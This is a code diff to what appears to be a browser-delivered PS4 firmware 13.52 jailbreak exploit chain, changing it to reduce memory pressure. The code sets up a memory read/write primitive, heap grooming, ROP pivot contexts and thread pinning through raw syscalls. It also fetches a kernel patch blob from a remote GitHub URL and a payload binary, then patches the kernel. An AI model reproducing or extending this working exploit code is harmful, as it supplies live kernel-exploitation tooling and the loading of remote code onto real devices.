@@ -1,7 +1,7 @@
 // ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
 // module record and releaseFakeCell() (only call site: mem.js:662) reaches a
 // virgin instance, pinning ~137 MB for the life of the page.
-import { establishPrimitive } from "./core.mjs?v=10";
+import { establishPrimitive, dropGroomFootprint } from "./core.mjs?v=10";
 import { installWindowP, pairStatus } from "./mem.mjs";
 import { int64 } from "./int64.mjs";
 import { offsetsFor } from "./ps4_13.52.mjs";
@@ -12,6 +12,7 @@ import {
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
 const lines = [];
+const LOG_CAP = 96;
 let passCount = 0, failCount = 0;
 const params = new URLSearchParams(location.search);
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
@@ -50,6 +51,8 @@ function mark(tag, detail) {
     const raw = detail;
     detail = terse(detail);
     lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
+    if (lines.length > LOG_CAP)
+        lines.splice(0, lines.length - LOG_CAP);
     const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
     outEl.innerHTML = lines.map(function (l) {
         l = esc(l);
@@ -123,7 +126,7 @@ let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false
 
 let allDone = false;
 
-const CHAIN_BUILD = "plop-13.52-2026-03-26-workerjs";
+const CHAIN_BUILD = "plop-13.52-2026-03-26-oomfix";
 
 (async function () {
     let p = null;
@@ -154,42 +157,49 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-workerjs";
             + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed"));
 
         let kpatch = null, payload = null;
-        // off.kpatch wins when a firmware shares another's kernel and therefore
-        // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
+        let kernelBlobsLoaded = false;
         const kpatchName = "patches/1352.bin";
         const kpatchRemote = "https://raw.githubusercontent.com/OptiTronOffical/polpNO-use/aec207b31694bb182e032033a1bfab0863c171dd/patches/1352.bin";
         const KPATCH_JMP_SITES = [];
-        try {
-            if (kpatchName) {
-                let r = await fetch(kpatchName, { cache: "no-store" });
-                if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
-                if (!kpatch || !kpatch.length) {
-                    r = await fetch(kpatchRemote, { cache: "no-store" });
+        mark("KPATCH-BLOB", "deferred name=" + kpatchName);
+        mark("PAYLOAD-BLOB", "deferred");
+
+        async function ensureKernelBlobs() {
+            if (kernelBlobsLoaded) return;
+            kernelBlobsLoaded = true;
+            try {
+                if (!kpatch) {
+                    let r = await fetch(kpatchName, { cache: "no-store" });
                     if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
+                    if (!kpatch || !kpatch.length) {
+                        r = await fetch(kpatchRemote, { cache: "no-store" });
+                        if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
+                    }
+                }
+            } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
+            if (kpatch && KPATCH_JMP_SITES.length === 0) {
+                for (let i = 0; i + 7 <= kpatch.length; ++i) {
+                    if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
+                    if (kpatch[i + 6] !== 0xeb) continue;
+                    KPATCH_JMP_SITES.push(((kpatch[i + 2]) | (kpatch[i + 3] << 8)
+                        | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
                 }
             }
-        } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
-        if (kpatch) {
-
-            for (let i = 0; i + 7 <= kpatch.length; ++i) {
-                if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
-                if (kpatch[i + 6] !== 0xeb) continue;
-                KPATCH_JMP_SITES.push(((kpatch[i + 2]) | (kpatch[i + 3] << 8)
-                    | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
-            }
+            mark("KPATCH-BLOB", kpatch
+                ? "blob=" + kpatchName + " bytes=" + kpatch.length
+                  + " sites=" + KPATCH_JMP_SITES.length
+                : "blob=" + kpatchName + " MISSING");
+            try {
+                if (!payload) {
+                    const r = await fetch("payload.bin");
+                    if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
+                }
+            } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
+            mark("PAYLOAD-BLOB", payload
+                ? "bytes=" + payload.length + " entry="
+                  + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
+                : "MISSING");
         }
-        mark("KPATCH-BLOB", kpatch
-            ? "blob=" + kpatchName + " bytes=" + kpatch.length
-              + " sites=" + KPATCH_JMP_SITES.length
-            : "blob=" + kpatchName + " MISSING");
-        try {
-            const r = await fetch("payload.bin");
-            if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
-        } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
-        mark("PAYLOAD-BLOB", payload
-            ? "bytes=" + payload.length + " entry="
-              + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
-            : "MISSING");
 
         state("running the primitive...", "warn");
         await new Promise(r => setTimeout(r, 0));
@@ -265,6 +275,13 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-workerjs";
         } else {
             mark("SWEEP-SKIPPED", "promoted=" + pairStatus.promoted
                 + " cycles=" + SWEEP_CYCLES);
+        }
+        {
+            const gd = dropGroomFootprint();
+            mark("GROOM-DROP-CHAIN", "dropped=" + (gd.dropped ? 1 : 0)
+                + (gd.reason ? " reason=" + gd.reason : ""));
+            for (let bi = 0; bi < 16; ++bi)
+                await new Promise(r => setTimeout(r, 16));
         }
         mark("PRIMITIVE-OK", "");
 
@@ -407,15 +424,17 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-workerjs";
             }
         }
         const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
-        function makeCtx() {
+        function makeCtx(retain) {
             const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
             const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
-            keepAlive.push(sb, pb, kb, fb);
             const c = { storeDv: new DataView(sb), pivotDv: new DataView(pb),
                 stackDv: new DataView(kb), frameDv: new DataView(fb),
                 stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb) };
-            keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv,
-                c.stackU8, c.frameU8);
+            if (retain !== false) {
+                keepAlive.push(sb, pb, kb, fb);
+                keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv,
+                    c.stackU8, c.frameU8);
+            }
             c.S = bufAddr(sb); c.P = bufAddr(pb);
             c.K = bufAddr(kb); c.F = bufAddr(fb);
             put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
@@ -658,6 +677,16 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-workerjs";
         const NUM_UIO_WORKER = params.has("uio")
             ? parseInt(params.get("uio"), 10) : 4;
         const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
+        async function jscBreath(n, why) {
+            mark("JSC-BREATH", "start n=" + n + " at=" + why);
+            for (let bi = 0; bi < n; ++bi) {
+                await new Promise(r => setTimeout(r, 0));
+                sc(SYS.sched_yield);
+            }
+            mark("JSC-BREATH", "done n=" + n + " at=" + why);
+        }
+        dropGroomFootprint();
+        await jscBreath(6, "pre-worker-pool");
         state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
         for (let i = 0; i < TOTAL_WORKERS; ++i) {
             const name = (i < NUM_IOV_WORKER ? "iov" : "uio")
@@ -670,7 +699,7 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-workerjs";
                 throw new Error(name + " did not answer ping");
             const sLo = (0x10100000 | i) >>> 0, sHi = (0xc0de0000 | i) >>> 0;
             const arr = await w.rpc("init", 15000, sLo, sHi);
-            keepAlive.push(arr);
+            w.markerArr = arr;
             const D = bufAddr(arr.buffer);
             if ((p.read4(D) >>> 0) !== sLo)
                 throw new Error(name + ": transfer did not preserve the store");
@@ -694,7 +723,8 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-workerjs";
             await w.rpc("setup", 15000, wl.low, wl.hi);
             await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
             w.armed = true;
-            w.ctx = makeCtx();
+            await new Promise(r => setTimeout(r, 0));
+            sc(SYS.sched_yield);
         }
         check("worker-came-arw",
             workers.length === TOTAL_WORKERS,
@@ -796,13 +826,21 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-workerjs";
                 + " affinity=" + a + " rtprio=" + r);
         }
         function fireW(w, num, args, timeoutMs) {
-            layout(w.ctx, stubAddr.get(num), args);
+            if (!w.ctx) w.ctx = makeCtx(false);
+            const stub = stubAddr.get(num);
+            if (!stub)
+                throw new Error("fireW: missing stub num=0x" + (num >>> 0).toString(16));
+            layout(w.ctx, stub, args);
             return w.rpc("fire", timeoutMs === undefined ? 15000 : timeoutMs,
                 w.ctx.S.low, w.ctx.S.hi);
         }
+        dropGroomFootprint();
+        lines.splice(0, Math.max(0, lines.length - 48));
         for (const w of workers) {
+            sc(SYS.sched_yield);
             await fireW(w, SYS.cpuset_setaffinity, [CPU_LEVEL_WHICH, CPU_WHICH_TID,
                 new int64(0xffffffff, 0xffffffff), 0x10, maskAddr]);
+            sc(SYS.sched_yield);
             await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr]);
         }
         mark("WORKERS-PINNED", "n=" + workers.length + " core=" + MAIN_CORE
@@ -2292,6 +2330,7 @@ const CHAIN_BUILD = "plop-13.52-2026-03-26-workerjs";
 
 
                     let kpatched = false;
+                    await ensureKernelBlobs();
                     if (jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) {
                         state("kernel patches...", "warn");
                         const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 0x2c;
